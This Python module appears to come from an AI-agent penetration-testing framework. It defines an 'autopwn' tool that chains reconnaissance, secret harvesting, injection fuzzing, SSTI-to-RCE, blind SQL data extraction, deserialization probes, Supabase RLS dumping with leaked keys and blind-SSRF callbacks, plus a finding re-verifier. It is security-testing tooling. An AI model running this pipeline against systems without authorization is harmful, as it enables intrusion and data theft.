"""autopwn — chained, self-verifying deep scan driven by prior leaks.

One call runs the pivot an operator would: fingerprint the stack, discover hidden
params/endpoints, harvest leaks (secrets, SSR data, .git/.env, source maps), then
FEED those leaks into the next stage — a leaked Supabase key becomes an RLS dump,
hidden params become an injection fuzz, discovered endpoints get ranked and hit
for data exposure/CORS, a GraphQL schema gets field-leak-tested. Every finding is
double-confirmed (adversarial verification) before it's kept, then chained.
"""

from __future__ import annotations

import asyncio
import json
from typing import TYPE_CHECKING, Any
from urllib.parse import parse_qs, quote, urljoin, urlparse, urlunparse

from agents import RunContextWrapper, function_tool

from strix.config.settings import depth_cap
from strix.report.state import get_global_report_state
from strix.tools.authz_matrix.tools import _authz_matrix_impl
from strix.tools.backend_rules_probe.tools import _backend_rules_probe_impl
from strix.tools.chain_suggest.tools import _chain_suggest_impl
from strix.tools.cors_probe.tools import _cors_probe_impl
from strix.tools.data_exposure.tools import _data_exposure_impl
from strix.tools.deep_fuzz.tools import _deep_fuzz_impl
from strix.tools.deserial_probe.tools import _deserial_impl
from strix.tools.deserial_probe.tools import fingerprint as _deserial_fingerprint
from strix.tools.discovery.tools import _content_discover_impl, _param_discover_impl
from strix.tools.error_leak.tools import _error_leak_impl
from strix.tools.frontend_secret_scan.tools import _frontend_secret_scan_impl
from strix.tools.graphql_deep.tools import _graphql_field_leak_impl
from strix.tools.header_leak.tools import _header_leak_impl
from strix.tools.http_replay.tools import _replay_impl
from strix.tools.injection_fuzz.tools import _injection_fuzz_impl
from strix.tools.oast.client import get_domain as _oast_get_domain
from strix.tools.oast.client import poll as _oast_poll
from strix.tools.profile_target.tools import _profile_target_impl
from strix.tools.security_headers.tools import _security_headers_impl
from strix.tools.sqli_dump.tools import _sqli_impl
from strix.tools.ssr_leak.tools import _ssr_leak_impl
from strix.tools.ssti_rce.tools import _ssti_impl
from strix.tools.storage_probe.tools import _storage_probe_impl


if TYPE_CHECKING:
    from collections.abc import Callable


def _safe(fn: Callable[[], dict[str, Any]]) -> dict[str, Any]:
    try:
        return fn()
    except Exception as exc:  # noqa: BLE001 (never let one stage kill the pipeline)
        return {"success": False, "error": f"{type(exc).__name__}: {exc}"}


def _finding(
    kind: str, title: str, severity: str, detail: Any, verify: Callable[[], bool] | None
) -> dict[str, Any]:
    # Adversarial verification: re-run the check; keep the verdict either way.
    verified = None
    if verify is not None:
        verified = _safe(lambda: {"v": verify()}).get("v", False)
    return {
        "kind": kind,
        "title": title,
        "severity": severity,
        "verified": verified,
        "detail": detail,
    }


def _slot_after_param(url: str, param: str) -> str:
    """Return ``url`` with a ``{PAYLOAD}`` slot right after ``param``'s value.

    Lets the SQLi engine splice inference SQL after the injectable parameter even
    when it isn't the last one in the query string.
    """
    parsed = urlparse(url)
    pairs = parse_qs(parsed.query, keep_blank_values=True)
    parts: list[str] = []
    seen = False
    for key, vals in pairs.items():
        val = vals[-1]
        if key == param:
            seen = True
            parts.append(f"{quote(key)}={quote(val or '1')}{{PAYLOAD}}")
        else:
            parts.append(f"{quote(key)}={quote(val)}")
    if not seen:
        parts.append(f"{quote(param)}=1{{PAYLOAD}}")
    return urlunparse(parsed._replace(query="&".join(parts)))


def _autopwn_impl(  # noqa: PLR0915
    seed_url: str,
    headers: dict[str, str] | None,
    supabase_anon_key: str | None,
    identities: list[dict[str, Any]] | None,
    file_reports: bool,
    max_passes: int,
    timeout: int,
) -> dict[str, Any]:
    if not seed_url or not seed_url.strip():
        return {"success": False, "error": "seed_url cannot be empty"}
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()

    def add(
        kind: str, title: str, sev: str, detail: Any, verify: Callable[[], bool] | None = None
    ) -> bool:
        key = (kind, title.split(" (", 1)[0])
        if key in seen:
            return False
        seen.add(key)
        findings.append(_finding(kind, title, sev, detail, verify))
        return True

    # OAST listener for the blind class (best-effort; None if unreachable).
    oast = _safe(lambda: _oast_get_domain(timeout=timeout))
    oast_domain = oast.get("domain") if oast.get("success") else None
    oast_corr = oast.get("correlation_id") if oast.get("success") else None

    prof = _safe(lambda: _profile_target_impl(seed_url, timeout))
    baas = prof.get("baas") or []
    api = prof.get("api") or []
    art = {
        "supa_url": prof.get("supabase_url"),
        "supa_key": prof.get("supabase_anon_key") or supabase_anon_key,
    }

    endpoints: set[str] = {seed_url}
    processed: set[str] = set()

    def _harvest_seed() -> None:
        secret = _safe(
            lambda: _frontend_secret_scan_impl(seed_url, validate=False, timeout=timeout)
        )
        for s in secret.get("findings", []):
            if s.get("severity") in {"critical", "high"}:
                add("secret", f"Leaked {s['type']} in JS bundle", s["severity"], s)
            if s.get("type") == "supabase_anon_key" and not art["supa_key"]:
                art["supa_key"] = s.get("value")
        ssr = _safe(lambda: _ssr_leak_impl(seed_url, timeout))
        if ssr.get("possible_ssr_leak"):
            add(
                "data_leak",
                "Sensitive data embedded in SSR page",
                "high",
                ssr.get("results"),
                lambda: _safe(lambda: _ssr_leak_impl(seed_url, timeout)).get(
                    "possible_ssr_leak", False
                ),
            )
        storage = _safe(lambda: _storage_probe_impl(seed_url, None, timeout))
        if storage.get("possible_exposure"):
            add(
                "information disclosure",
                "Exposed .git/.env/backup files",
                "high",
                storage.get("exposed"),
                lambda: _safe(lambda: _storage_probe_impl(seed_url, None, timeout)).get(
                    "possible_exposure", False
                ),
            )
        errleak = _safe(lambda: _error_leak_impl("GET", seed_url, "id", headers, timeout))
        if errleak.get("possible_error_leak"):
            add(
                "information disclosure",
                "Verbose error / stack trace leak",
                "medium",
                errleak.get("findings"),
            )
        hleak = _safe(lambda: _header_leak_impl(seed_url, timeout))
        if hleak.get("possible_header_leak"):
            add("data_leak", "Version/debug/PII leak in headers", "low", hleak.get("findings"))
        sh = _safe(lambda: _security_headers_impl(seed_url, timeout))
        if sh.get("possible_hardening_gaps"):
            add(
                "misconfiguration",
                "Missing security headers",
                "low",
                {"missing": sh.get("missing_headers"), "cookies": sh.get("cookie_issues")},
            )
        content = _safe(lambda: _content_discover_impl(seed_url, None, timeout))
        for f in content.get("found", []):
            endpoints.add(urljoin(seed_url, f["path"]))

    def _escalate(esc_url: str, pnames: list[str], fuzz_findings: list[dict[str, Any]]) -> bool:
        # Turn an injection *signal* into proven impact: SSTI->RCE and blind SQLi
        # ->data extraction. Confirmation stays non-destructive (sleep/OAST); the
        # extracted sample is bounded by the sqli engine's own caps.
        esc = False
        ssti = _safe(
            lambda: _ssti_impl(
                esc_url,
                pnames[0],
                "query",
                None,
                None,
                "GET",
                headers,
                None,
                oast_domain or "",
                timeout,
            )
        )
        if ssti.get("vulnerable"):
            esc |= add(
                "rce",
                f"SSTI to RCE in {esc_url} ({ssti.get('engine') or 'template engine'})",
                "critical",
                ssti,
                lambda: _safe(
                    lambda: _ssti_impl(
                        esc_url, pnames[0], "query", None, None, "GET", headers, None, "", timeout
                    )
                ).get("vulnerable", False),
            )
        sql_params = [
            f.get("param")
            for f in fuzz_findings
            if "sql" in str(f.get("family", "")).lower() and f.get("param")
        ]
        if sql_params:
            slot = _slot_after_param(esc_url, str(sql_params[0]))
            dump = _safe(
                lambda: _sqli_impl(
                    slot, "time", None, None, "GET", headers, None, 3, 5, 2, 40, timeout
                )
            )
            if dump.get("vulnerable"):
                esc |= add(
                    "injection",
                    f"Blind SQLi data extraction on {esc_url} ({dump.get('dbms')})",
                    "critical",
                    {
                        "dbms": dump.get("dbms"),
                        "version": dump.get("version"),
                        "tables": dump.get("tables"),
                        "sample": dump.get("sample"),
                    },
                )
        return esc

    def _pivot_deserial() -> bool:
        # Grab the seed's Set-Cookie, fingerprint each cookie, and if any looks
        # serialized, run the deserialization RCE probe against it.
        resp = _safe(
            lambda: _replay_impl("GET", seed_url, headers, None, timeout, allow_redirects=True)
        )
        if not resp.get("success"):
            return False
        raw_cookie = ""
        for hk, hv in (resp.get("response_headers") or {}).items():
            if hk.lower() == "set-cookie":
                raw_cookie = str(hv)
                break
        found = False
        for chunk in raw_cookie.split(","):
            pair = chunk.strip().split(";", 1)[0]
            cname, sep, cval = pair.partition("=")
            if not sep or not _deserial_fingerprint(cval):
                continue
            cn = cname.strip()

            def _run_deserial(cn: str = cn, cv: str = cval) -> dict[str, Any]:
                return _deserial_impl(
                    seed_url,
                    "cookie",
                    cn,
                    cv,
                    None,
                    None,
                    "GET",
                    headers,
                    None,
                    "base64",
                    None,
                    oast_domain or "",
                    timeout,
                )

            d = _safe(_run_deserial)
            if d.get("vulnerable"):
                found |= add(
                    "rce",
                    f"Insecure deserialization RCE via cookie '{cname.strip()}'",
                    "critical",
                    d,
                )
        return found

    def _probe_endpoint(url: str) -> bool:
        found = False
        params = _safe(lambda: _param_discover_impl(url, headers, None, timeout))
        pnames = [p["param"] for p in params.get("hidden_params", [])][: depth_cap(6, 30)]
        if pnames:
            fuzz = _safe(
                lambda: _deep_fuzz_impl("GET", url, pnames, headers, None, "query", 120, timeout)
            )
            for f in fuzz.get("findings", []):
                found |= add(
                    "injection",
                    f"{f['family']} injection in {url} ({f['param']})",
                    f.get("severity", "high"),
                    f,
                )
            if oast_domain:  # plant blind-SSRF callbacks; confirmed later by _poll_oast
                _safe(
                    lambda: _injection_fuzz_impl(
                        "GET", url, pnames, headers, None, "query", oast_domain, timeout
                    )
                )
            found |= _escalate(url, pnames, fuzz.get("findings", []))
        cors = _safe(lambda: _cors_probe_impl(url, "GET", None, timeout))
        if cors.get("possible_cors_issue"):
            found |= add(
                "access control",
                f"Permissive CORS on {url}",
                cors.get("worst_severity") or "medium",
                cors.get("results"),
                lambda: _safe(lambda: _cors_probe_impl(url, "GET", None, timeout)).get(
                    "possible_cors_issue", False
                ),
            )
        if headers is not None:
            expo = _safe(lambda: _data_exposure_impl("GET", url, headers, timeout))
            if expo.get("possible_excessive_exposure"):
                found |= add(
                    "data_leak",
                    f"Excessive data exposure on {url}",
                    "high",
                    expo.get("sensitive_fields"),
                )
        return found

    def _pivot_supabase() -> bool:
        su, sk = art["supa_url"], art["supa_key"]
        if not (su and sk):
            return False
        backend = _safe(lambda: _backend_rules_probe_impl("supabase", su, sk, None, timeout))
        if backend.get("possible_open_rules"):
            return add(
                "idor",
                "Broken Supabase RLS via leaked anon key (cross-tenant data)",
                "critical",
                backend.get("results"),
                lambda: _safe(
                    lambda: _backend_rules_probe_impl("supabase", su, sk, None, timeout)
                ).get("possible_open_rules", False),
            )
        return False

    def _pivot_graphql() -> bool:
        if not ("graphql" in api or any("graphql" in e for e in endpoints)):
            return False
        gql = _safe(
            lambda: _graphql_field_leak_impl(seed_url.rstrip("/") + "/graphql", headers, timeout)
        )
        if gql.get("possible_field_leak"):
            return add(
                "data_leak",
                "GraphQL exposes sensitive fields",
                "high",
                gql.get("schema_sensitive_fields"),
            )
        return False

    def _pivot_authz() -> bool:
        if not identities:
            return False
        m = _safe(
            lambda: _authz_matrix_impl(
                list(processed or endpoints)[: depth_cap(20, 100)],
                identities,
                headers,
                timeout,
                200,
            )
        )
        found = False
        for cell in m.get("flagged", []):
            found |= add("idor", f"Broken access control on {cell.get('endpoint')}", "high", cell)
        return found

    def _poll_oast() -> bool:
        if not oast_domain:
            return False
        res = _safe(lambda: _oast_poll(oast_corr, timeout))
        found = False
        for it in res.get("interactions", []):
            found |= add(
                "ssrf",
                f"Blind SSRF: {it.get('protocol')} callback ({it.get('full_id', '')})",
                "critical",
                it,
            )
        return found

    _harvest_seed()
    passes = 0
    # Max-depth raises both the floor (run more passes even if asked for few) and
    # the ceiling; normal mode keeps the 1..4 bound.
    max_passes = max(depth_cap(1, 8), min(max_passes, depth_cap(4, 12)))
    while passes < max_passes:
        passes += 1
        new = False
        for url in [e for e in list(endpoints) if e not in processed][: depth_cap(12, 60)]:
            processed.add(url)
            new |= _probe_endpoint(url)
        new |= _pivot_supabase()
        new |= _pivot_graphql()
        new |= _pivot_authz()
        if passes == 1:  # deserial pivot is seed-scoped; one shot is enough
            new |= _pivot_deserial()
        new |= _poll_oast()
        if not new and endpoints <= processed:
            break

    chains = _safe(lambda: _chain_suggest_impl(findings)).get("chains", [])

    verified = [f for f in findings if f["verified"] is True]
    filed = 0
    if file_reports:
        state = get_global_report_state()
        if state is not None:
            for f in verified:
                try:
                    state.add_vulnerability_report(
                        title=f["title"],
                        severity=f["severity"],
                        target=seed_url,
                        description=str(f.get("detail"))[:2000],
                        finding_class=f["kind"],
                        validated=True,
                    )
                    filed += 1
                except Exception:  # noqa: BLE001, S112 (one bad report never aborts filing)
                    continue

    return {
        "success": True,
        "seed_url": seed_url,
        "passes": passes,
        "oast_domain": oast_domain,
        "profile": {
            "framework": prof.get("framework"),
            "baas": baas,
            "api": api,
            "supabase_key_found": bool(art["supa_key"]),
        },
        "endpoints_probed": len(processed),
        "finding_count": len(findings),
        "verified_count": len(verified),
        "filed_reports": filed,
        "findings": findings,
        "chains": chains,
    }


def _verify_finding_impl(
    kind: str,
    url: str,
    method: str,
    param: str | None,
    headers: dict[str, str] | None,
    supabase_url: str | None,
    supabase_anon_key: str | None,
    runs: int,
    timeout: int,
) -> dict[str, Any]:
    kind = (kind or "").lower()

    def _check() -> bool:  # noqa: PLR0911
        if kind in {"cors", "access control"}:
            return bool(_cors_probe_impl(url, method, None, timeout).get("possible_cors_issue"))
        if kind in {"injection", "sqli", "ssti", "xss"} and param:
            r = _deep_fuzz_impl(method, url, [param], headers, None, "query", 100, timeout)
            return bool(r.get("possible_injection"))
        if kind in {"data_exposure", "data_leak"}:
            return bool(
                _data_exposure_impl(method, url, headers, timeout).get(
                    "possible_excessive_exposure"
                )
            )
        if kind in {"backend_rules", "supabase", "idor"} and supabase_url and supabase_anon_key:
            r = _backend_rules_probe_impl(
                "supabase", supabase_url, supabase_anon_key, None, timeout
            )
            return bool(r.get("possible_open_rules"))
        if kind == "ssr":
            return bool(_ssr_leak_impl(url, timeout).get("possible_ssr_leak"))
        if kind in {"storage", "information disclosure"}:
            return bool(_storage_probe_impl(url, None, timeout).get("possible_exposure"))
        if kind == "header":
            return bool(_header_leak_impl(url, timeout).get("possible_header_leak"))
        if kind == "secret":
            return bool(
                _frontend_secret_scan_impl(url, validate=True, timeout=timeout).get(
                    "possible_secret_leak"
                )
            )
        raise ValueError(f"no verifier for kind {kind!r} (with the params given)")

    runs = max(2, min(runs, 5))
    hits = 0
    errors: list[str] = []
    for _ in range(runs):
        out = _safe(lambda: {"v": _check()})
        if "error" in out:
            errors.append(str(out["error"]))
        elif out.get("v"):
            hits += 1
    confirmed = hits >= (runs // 2 + 1)
    return {
        "success": True,
        "kind": kind,
        "runs": runs,
        "signal_reproduced": hits,
        "verdict": "CONFIRMED" if confirmed else "NOT_REPRODUCED",
        "errors": errors[:3],
    }


@function_tool(timeout=180, strict_mode=False)
async def verify_finding(
    ctx: RunContextWrapper,
    kind: str,
    url: str,
    method: str = "GET",
    param: str | None = None,
    headers: dict[str, str] | None = None,
    supabase_url: str | None = None,
    supabase_anon_key: str | None = None,
    runs: int = 3,
    timeout: int = 15,
) -> str:
    """Adversarially re-confirm a single finding — re-run its check N times.

    Runs the class-appropriate probe ``runs`` times and returns CONFIRMED only if
    the signal reproduces in the majority — killing flaky/one-off false positives
    before you file. Supported ``kind``: cors, injection (needs ``param``),
    data_exposure/data_leak, backend_rules/supabase (needs ``supabase_url`` +
    ``supabase_anon_key``), ssr, storage, header, secret. Only test authorized
    targets.

    Returns JSON with ``verdict`` (CONFIRMED / NOT_REPRODUCED) and
    ``signal_reproduced`` / ``runs``.

    Args:
        kind: The finding class to re-verify.
        url: The URL the finding is on.
        method: HTTP method (default GET).
        param: The parameter (for injection).
        headers: Session headers if the finding needs auth.
        supabase_url: Supabase project URL (for backend_rules).
        supabase_anon_key: Supabase anon key (for backend_rules).
        runs: How many times to re-run (default 3, max 5).
        timeout: Per-request timeout in seconds (default 15).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _verify_finding_impl,
            kind,
            url,
            method,
            param,
            headers,
            supabase_url,
            supabase_anon_key,
            runs,
            timeout,
        ),
        ensure_ascii=False,
        default=str,
    )


@function_tool(timeout=900, strict_mode=False)
async def autopwn(
    ctx: RunContextWrapper,
    seed_url: str,
    headers: dict[str, str] | None = None,
    supabase_anon_key: str | None = None,
    identities: list[dict[str, Any]] | None = None,
    file_reports: bool = False,
    max_passes: int = 3,
    timeout: int = 15,
) -> str:
    """Run a chained, self-verifying deep scan that pivots on prior leaks.

    One call: fingerprint the stack, discover hidden params/endpoints, harvest
    leaks (secrets/SSR/\u200b.git/\u200b.env/source maps/headers), then feed those leaks into
    deeper probes — a leaked Supabase key dumps tables (RLS bypass), hidden params
    get injection-fuzzed, GraphQL gets field-leak-tested, discovered endpoints get
    CORS/data-exposure checks. Every finding is re-run to confirm it (adversarial
    verification), then findings are chained into escalation paths. Pass a session
    in ``headers`` to reach authed surfaces. Only test authorized targets.

    Returns JSON with ``findings`` (kind/title/severity/verified), ``chains``, the
    detected ``profile``, and what was ``discovered``.

    Args:
        seed_url: The target URL to start from.
        headers: Optional session headers to reach authenticated surfaces.
        supabase_anon_key: Supabase anon key if you already have it (else it's
            auto-extracted from the bundle).
        identities: Optional list of auth contexts (each a dict, e.g.
            {"name": "userA", "headers": {"Authorization": "Bearer ..."}}) to run a
            cross-identity IDOR/BOLA grid against discovered endpoints.
        file_reports: If true, file each verified finding as a validated
            vulnerability report in the current run's report state.
        max_passes: Max discovery/probe passes (1-4). Stops early once a pass adds
            no new finding and nothing is left to probe.
        timeout: Per-request timeout in seconds (default 15).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _autopwn_impl,
            seed_url,
            headers,
            supabase_anon_key,
            identities,
            file_reports,
            max_passes,
            timeout,
        ),
        ensure_ascii=False,
        default=str,
    )
